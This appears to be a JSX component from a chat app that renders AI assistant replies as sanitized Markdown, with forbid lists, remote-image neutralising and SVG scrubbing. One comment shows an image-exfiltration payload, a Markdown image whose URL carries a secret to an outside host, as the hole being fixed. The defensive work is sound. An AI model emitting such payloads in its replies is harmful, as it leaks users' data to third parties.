// markdown.jsx — MarkdownMessage component used by chat.jsx for assistant
// messages. User messages stay on the plain pre-wrap path in chat.jsx.
//
// Pipeline:
//   markdown text → marked (parser, custom code renderer + hljs)
//                 → DOMPurify (sanitize)
//                 → neutraliseRemoteContent (remote images become links)
//                 → innerHTML
//                 → post-mount DOM walk (Save/Copy on code blocks, citations, search)
//
// Why the post-mount DOM walk: marked produces HTML strings, but our two
// pre-existing UI affordances on assistant text — citation chips for [N]
// markers and search-result <mark> highlights — were React-element-based
// in renderMessageContent. Re-implementing them as marked plugins would
// muddy the markdown parser; doing them as a DOM pass after innerHTML is
// the cleanest split (libs handle markdown, we handle our annotations).
//
// During streaming, we render plain text instead: re-parsing markdown on
// every token chunk is wasteful, and a half-typed ```fence``` would flip
// between code-block and paragraph layouts as the closing backticks
// arrive. Plaintext mid-stream → markdown on `done` is the smoother UX.
//
// React hooks (useEffect, useMemo, useRef) come from tokens.jsx's
// top-level destructure — Babel-standalone's text/babel script tags share
// global script scope so we don't redeclare here.

// One-time marked configuration. We register our custom code renderer here
// so every MarkdownMessage shares the same hljs-aware code path. Done
// inside an idempotent guard because Babel script-tag re-execution would
// otherwise re-register on every component mount in dev mode (no actual
// harm — marked.use is additive — but cleaner this way).
'use strict';
function ensureMarkedConfigured() {
  if (typeof marked === 'undefined') return false;
  if (window.__ekMarkedConfigured) return true;
  // gfm: tables, strikethrough, fenced code blocks. breaks: false because
  // hard-wrapping every newline as <br> makes prose look choppy; users
  // wanting a line break can use two newlines (paragraph) or trailing
  // double-space (the GFM way).
  marked.setOptions({ gfm: true, breaks: false });
  marked.use({
    renderer: {
      // Accept BOTH renderer signatures:
      //   v13+ object form:   code({ text, lang, escaped })
      //   pre-v13 positional: code(text, lang, escaped)
      // Despite the marked v13 docs claiming the object form is canonical,
      // the minified bundle's marked.use wrapper sometimes routes the
      // positional form through anyway (depending on how the renderer is
      // composed). Defensive disambiguation here keeps us correct on any
      // packaging path — and the cost is a few cheap typeof checks.
      code(arg1, arg2) {
        let text, lang;
        if (arg1 && typeof arg1 === 'object') {
          text = arg1.text;
          lang = arg1.lang;
        } else {
          text = arg1;
          lang = arg2;
        }
        // Guard against weird inputs (null/undefined) — if we couldn't
        // pull text out of either signature, render an empty block rather
        // than the literal string "undefined".
        if (typeof text !== 'string') text = '';
        const language = (lang || '').trim().toLowerCase();
        let highlighted;
        let appliedLang = language;
        if (typeof hljs !== 'undefined') {
          try {
            if (language && hljs.getLanguage(language)) {
              highlighted = hljs.highlight(text, { language }).value;
            } else {
              const auto = hljs.highlightAuto(text);
              highlighted = auto.value;
              if (!appliedLang && auto.language) appliedLang = auto.language;
            }
          } catch (_) {
            highlighted = escapeHtml(text);
          }
        } else {
          highlighted = escapeHtml(text);
        }
        const langAttr = appliedLang ? ` data-lang="${escapeAttr(appliedLang)}"` : '';
        // The language the model itself wrote on the fence, kept apart from
        // `data-lang` (which may be a guess made for colouring): the Save
        // button names the file from this one only.
        const fenceAttr = language ? ` data-fence="${escapeAttr(language)}"` : '';
        const classAttr = `hljs${appliedLang ? ' language-' + escapeAttr(appliedLang) : ''}`;
        // Pre.ek-code is what our CSS targets; the surrounding scoping
        // (.ek-md pre.ek-code) keeps styles from leaking to any future
        // non-assistant code rendering.
        return `<pre class="ek-code"${langAttr}${fenceAttr}><code class="${classAttr}">${highlighted}</code></pre>`;
      },
    },
  });
  window.__ekMarkedConfigured = true;
  return true;
}

// escapeHtml + escapeAttr live in `ui/utils.js` so they're unit-testable
// under node:test. They're on `window` before this file loads.

// Render one extracted math segment ({tex, display}) to HTML. Called by
// restoreMathSegments AFTER DOMPurify has sanitized the document — that's
// safe because katex.renderToString with the default trust:false escapes
// everything and renders trust-gated commands (\href, \includegraphics)
// inert, and throwOnError:false turns TeX parse errors into an escaped
// red rendering of the source instead of a throw. If KaTeX failed to
// load, degrade to the literal $-delimited source (escaped).
function renderKatexSegment(seg) {
  const fallback = () => {
    const d = seg.display ? "$$" : "$";
    return escapeHtml(d + seg.tex + d);
  };
  if (typeof katex === "undefined") return fallback();
  try {
    return katex.renderToString(seg.tex, {
      displayMode: seg.display,
      throwOnError: false,
      strict: "ignore",
    });
  } catch (_) {
    return fallback();
  }
}

// A narrow scrub for an <svg> a reply carries inline (DOMPurify's SVG
// profile strips too much to keep such a drawing legible): no scripts, no
// foreignObject, no on* handlers, no non-fragment hrefs.
function scrubSvg(container) {
  container
    .querySelectorAll("script, foreignObject")
    .forEach((n) => n.remove());
  const walker = document.createTreeWalker(
    container,
    NodeFilter.SHOW_ELEMENT,
    null,
  );
  let node;
  while ((node = walker.nextNode())) {
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith("on")) {
        node.removeAttribute(attr.name);
      } else if (
        (name === "href" || name === "xlink:href") &&
        !attr.value.trim().startsWith("#")
      ) {
        node.removeAttribute(attr.name);
      }
    }
  }
}

// What a reply's HTML may never carry, on top of DOMPurify's defaults.
// Each of these can make the webview fetch a remote URL (a `style` with
// url(), `srcset`, `background`, the media elements) or post somewhere
// (`form`), and a `style` attribute can also paint over the app itself.
// marked emits none of them (tables align with the `align` attribute), so
// only raw HTML a model wrote loses anything. The page's content-security
// policy (the <meta> at the top of index.html) is the second lock on the
// same door: keep both.
const REPLY_FORBID_TAGS = ['style', 'form', 'video', 'audio', 'source', 'track', 'picture'];
const REPLY_FORBID_ATTR = ['style', 'srcset', 'background'];

// Second pass over SANITIZED reply HTML: nothing in it may load from
// anywhere but the reply itself.
//   • <img> whose bytes are not inline (replyImageIsInline) becomes a link
//     carrying the alt text, or plain text when the source is not a web
//     address. This is the fix for the image-exfiltration hole: a reply
//     with `![x](https://host/?d=secret)` used to be fetched on render.
//   • <input> survives only as the disabled checkbox of a GFM task list
//     (`<input type="image" src>` loads, and a text field has no business
//     in a reply).
//   • inline <svg> gets a narrow scrub (scrubSvg above).
// Runs in a <template>, whose content is inert: nothing parsed into it
// loads or executes.
function neutraliseRemoteContent(html) {
  if (!/<(img|input|svg)\b/i.test(html)) return html;
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  const root = tpl.content;
  root.querySelectorAll('img').forEach((img) => {
    const src = img.getAttribute('src') || '';
    if (replyImageIsInline(src)) return;
    const url = externalLinkTarget(src);
    const label = (img.getAttribute('alt') || '').trim() || url || src;
    const node = document.createElement(url ? 'a' : 'span');
    node.className = 'ek-remote-image';
    if (url) {
      node.setAttribute('href', url);
      node.setAttribute('title', url);
    }
    node.textContent = label;
    img.replaceWith(node);
  });
  root.querySelectorAll('input').forEach((input) => {
    if ((input.getAttribute('type') || '').toLowerCase() !== 'checkbox') {
      input.remove();
      return;
    }
    for (const attr of Array.from(input.attributes)) {
      if (attr.name !== 'type' && attr.name !== 'checked') input.removeAttribute(attr.name);
    }
    input.setAttribute('disabled', '');
  });
  root.querySelectorAll('svg').forEach((svg) => scrubSvg(svg));
  return tpl.innerHTML;
}

// A click on a link in a reply must never navigate the app's own window:
// that would replace the whole interface with a remote page. http(s) and
// mailto links open in the default browser, an in-page anchor (#fn1)
// scrolls, and anything else does nothing.
function handleReplyLinkClick(e) {
  const a = e.target && e.target.closest ? e.target.closest('a[href]') : null;
  if (!a || !e.currentTarget.contains(a)) return;
  const href = a.getAttribute('href') || '';
  if (href.trim().charAt(0) === '#') return;
  e.preventDefault();
  const url = externalLinkTarget(href);
  if (!url) return;
  try {
    getShellApi()?.open(url);
  } catch (_) {
    /* no opener available: stay where we are */
  }
}

// Save one code block as a file, at a place the person chooses. The model
// wrote the text; where it goes, and under what name, is asked in the OS
// save dialog every time. Resolves 'saved' | 'cancelled' | 'failed'.
async function saveCodeBlock(pre) {
  const dialogApi = getDialogApi();
  const invoke = getInvoke();
  if (!dialogApi || !invoke) return 'failed';
  const code = pre.querySelector('code');
  // textContent, not innerText: the text exactly as written, whatever the
  // layout is doing.
  let text = (code || pre).textContent || '';
  if (text && !text.endsWith('\n')) text += '\n';
  let path;
  try {
    path = await dialogApi.save({
      title: 'Save as a file',
      defaultPath: codeBlockFileName(pre.getAttribute('data-fence')),
    });
  } catch (e) {
    console.error('Save dialog failed:', e);
    return 'failed';
  }
  if (!path) return 'cancelled';
  try {
    await invoke('text_file_save', { path, contents: text });
    window.ekToast?.({ kind: 'success', title: 'Saved', body: path });
    return 'saved';
  } catch (e) {
    console.error('Save failed:', e);
    window.ekToast?.({ kind: 'error', title: 'Could not save the file', body: String(e?.message || e) });
    return 'failed';
  }
}

// Add "Save…" and "Copy" to every code block in `root`. Idempotent: bails
// if a block already has its buttons (so re-runs from the useEffect don't
// stack them). Save… is left out where there is no save dialog to ask.
function addCodeBlockButtons(root) {
  const blocks = root.querySelectorAll('pre.ek-code');
  const canSave = !!(getDialogApi() && getInvoke());
  blocks.forEach((pre) => {
    if (pre.querySelector(':scope > .ek-code-actions')) return;
    const bar = document.createElement('span');
    bar.className = 'ek-code-actions';

    // A label that changes for a moment after a click, then goes back.
    const flash = (btn, text, cls) => {
      const rest = btn.getAttribute('data-label');
      btn.textContent = text;
      if (cls) btn.classList.add(cls);
      setTimeout(() => {
        btn.textContent = rest;
        if (cls) btn.classList.remove(cls);
      }, 1400);
    };
    const button = (label, cls, aria, onClick) => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = `ek-code-btn ${cls}`;
      btn.textContent = label;
      btn.setAttribute('data-label', label);
      btn.setAttribute('aria-label', aria);
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        onClick(btn);
      });
      bar.appendChild(btn);
      return btn;
    };

    if (canSave) {
      button('Save…', 'ek-save-btn', 'Save this as a file', async (btn) => {
        const result = await saveCodeBlock(pre);
        if (result === 'saved') flash(btn, 'Saved', 'ek-copied');
        else if (result === 'failed') flash(btn, 'Not saved');
      });
    }
    button('Copy', 'ek-copy-btn', 'Copy this to the clipboard', async (btn) => {
      const code = pre.querySelector('code');
      const text = code ? code.innerText : pre.innerText;
      try {
        await navigator.clipboard.writeText(text);
        flash(btn, 'Copied', 'ek-copied');
      } catch (_) {
        // The clipboard can refuse (permission, an insecure context). Say
        // so on the button; it is rare in the app's own webview.
        flash(btn, 'Not copied');
      }
    });
    pre.appendChild(bar);
  });
}

// Walk text nodes in `root` and wrap [N] markers (for valid N in `sources`)
// with a <sup class="ek-citation"> chip. Skips text inside <pre>/<code> so
// citation-shaped tokens that happen to appear in source code (e.g. array
// index literals) aren't transformed.
function wrapCitations(root, sources) {
  if (!sources || sources.length === 0) return;
  const validIndices = new Set(sources.map((s) => s.citationIndex));
  if (validIndices.size === 0) return;
  const textNodes = collectTextNodes(root, /\[\d+\]/);
  for (const node of textNodes) {
    const text = node.nodeValue;
    const frag = document.createDocumentFragment();
    let lastIdx = 0;
    let matched = false;
    for (const m of text.matchAll(/\[(\d+)\]/g)) {
      const idx = parseInt(m[1], 10);
      if (!validIndices.has(idx)) continue;
      matched = true;
      if (m.index > lastIdx) {
        frag.appendChild(document.createTextNode(text.slice(lastIdx, m.index)));
      }
      const sup = document.createElement('sup');
      sup.className = 'ek-citation';
      const src = sources.find((s) => s.citationIndex === idx);
      if (src && src.path) sup.title = src.path;
      sup.textContent = String(idx);
      frag.appendChild(sup);
      lastIdx = m.index + m[0].length;
    }
    if (!matched) continue;
    if (lastIdx < text.length) {
      frag.appendChild(document.createTextNode(text.slice(lastIdx)));
    }
    node.parentNode.replaceChild(frag, node);
  }
}

// Apply the active search regex by wrapping matching substrings in a
// <mark class="ek-search">. Walks every text node — including inside code
// blocks — because the existing chat.jsx behaviour highlights everywhere.
function applySearchHighlight(root, regex) {
  if (!regex) return;
  const textNodes = collectTextNodes(root, regex);
  for (const node of textNodes) {
    const text = node.nodeValue;
    const frag = document.createDocumentFragment();
    let lastIdx = 0;
    let matched = false;
    // matchAll requires /g; defensively rebuild if the caller passed a
    // non-global regex (renderHighlighted in chat.jsx always builds /gi).
    const re = regex.flags.includes('g')
      ? regex
      : new RegExp(regex.source, regex.flags + 'g');
    for (const m of text.matchAll(re)) {
      matched = true;
      if (m.index > lastIdx) {
        frag.appendChild(document.createTextNode(text.slice(lastIdx, m.index)));
      }
      const mark = document.createElement('mark');
      mark.className = 'ek-search';
      mark.textContent = m[0];
      frag.appendChild(mark);
      lastIdx = m.index + m[0].length;
    }
    if (!matched) continue;
    if (lastIdx < text.length) {
      frag.appendChild(document.createTextNode(text.slice(lastIdx)));
    }
    node.parentNode.replaceChild(frag, node);
  }
}

// Collect text nodes under `root` whose value matches `predicate` (RegExp
// — tested with .test, not consumed). Skips text inside <pre>/<code> for
// the citation pass; the search pass passes `null` for skipCode to walk
// everything. Helper centralises the TreeWalker boilerplate.
function collectTextNodes(root, predicate, skipCode = true) {
  const out = [];
  const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null);
  let n;
  while ((n = walker.nextNode())) {
    if (skipCode) {
      let p = n.parentNode;
      let inCode = false;
      while (p && p !== root) {
        if (p.nodeName === 'CODE' || p.nodeName === 'PRE') { inCode = true; break; }
        p = p.parentNode;
      }
      // Citations are inside code → skip. Search markers are also harmful
      // inside the hljs token spans (would split them mid-token), so we
      // keep skipCode=true for both passes; matching inside code blocks
      // is a feature we can revisit later if anyone misses it.
      if (inCode) continue;
    }
    // Reset lastIndex BEFORE the test so global regexes (the search regex
    // is /.../gi) test from index 0 every time. Otherwise a successful
    // match advances lastIndex and the next text node gets a partial scan.
    if (predicate.global) predicate.lastIndex = 0;
    if (!predicate.test(n.nodeValue)) continue;
    out.push(n);
  }
  return out;
}

// Public component. Props mirror renderMessageContent's signature plus
// `streaming` so we can stay on the plaintext path while tokens arrive.
//
// Rules-of-Hooks: ALL hooks run on every render unconditionally. We can't
// early-return before useMemo/useEffect, otherwise toggling `streaming`
// from true to false would change the hook count and React crashes with
// "Rendered more hooks than during the previous render". The actual
// markdown work is skipped via internal short-circuits when streaming.
function MarkdownMessage({ content, highlightRegex, sources, streaming }) {
  const ref = useRef(null);

  // Parse markdown only when NOT streaming. During streaming we don't want
  // to re-parse per token and a half-typed fence would flip layouts; we
  // still call useMemo so the hook order stays stable.
  const html = useMemo(() => {
    if (streaming) return '';
    if (!content) return '';
    const ok = ensureMarkedConfigured();
    if (!ok || typeof DOMPurify === 'undefined') {
      // Library failed to load — degrade to plaintext with <br>s so the
      // user still sees their message. Escapes HTML to keep this safe.
      return escapeHtml(content).replace(/\n/g, '<br>');
    }
    // Math leaves the document BEFORE marked runs — otherwise `$a_i$`
    // becomes `$a<em>i$</em>`-ish wreckage before KaTeX ever sees it —
    // and returns AFTER DOMPurify as katex.renderToString output, which
    // is safe by construction (trust:false; see renderKatexSegment).
    const { text: mathless, segments } = extractMathSegments(content);
    let raw;
    try {
      raw = marked.parse(mathless);
    } catch (_) {
      return escapeHtml(content).replace(/\n/g, '<br>');
    }
    // DOMPurify defaults already block <script>, event handlers, javascript:
    // URLs, etc. We add data-lang to ADD_ATTR so our code-block language
    // badge survives sanitization, forbid what could load or post
    // (REPLY_FORBID_*), then turn every non-inline image into a link.
    const clean = neutraliseRemoteContent(DOMPurify.sanitize(raw, {
      ADD_ATTR: ['data-lang', 'data-fence'],
      FORBID_TAGS: REPLY_FORBID_TAGS,
      FORBID_ATTR: REPLY_FORBID_ATTR,
    }));
    return restoreMathSegments(clean, segments, renderKatexSegment);
  }, [content, streaming]);

  // Post-mount annotation pass. Order matters: the code blocks' Save and
  // Copy buttons first (they attach to existing <pre> elements), then
  // citation wrapping (which
  // mutates text nodes outside <code>), then search highlighting (which
  // walks text nodes including the new citation text — search-matching
  // a citation number is fine because the citation chip carries the
  // number as its textContent). No-op while streaming because the ref
  // points to the plaintext branch, not the markdown root.
  useEffect(() => {
    if (streaming) return;
    if (!ref.current) return;
    addCodeBlockButtons(ref.current);
    if (sources && sources.length) wrapCitations(ref.current, sources);
    if (highlightRegex) applySearchHighlight(ref.current, highlightRegex);
  }, [html, sources, highlightRegex, streaming]);

  // Streaming branch: render as plaintext via the existing helper so the
  // visual is identical to the prior code path. The hook calls above have
  // already run with stable shape, so React's hook order stays consistent
  // across the streaming → done transition.
  if (streaming) {
    const rmc = (typeof renderMessageContent === 'function')
      ? renderMessageContent
      : null;
    return (
      <div style={{ whiteSpace: 'pre-wrap' }}>
        {rmc ? rmc(content, highlightRegex, sources) : content}
      </div>
    );
  }

  return (
    <div
      ref={ref}
      className="ek-md"
      onClick={handleReplyLinkClick}
      onAuxClick={handleReplyLinkClick}
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}
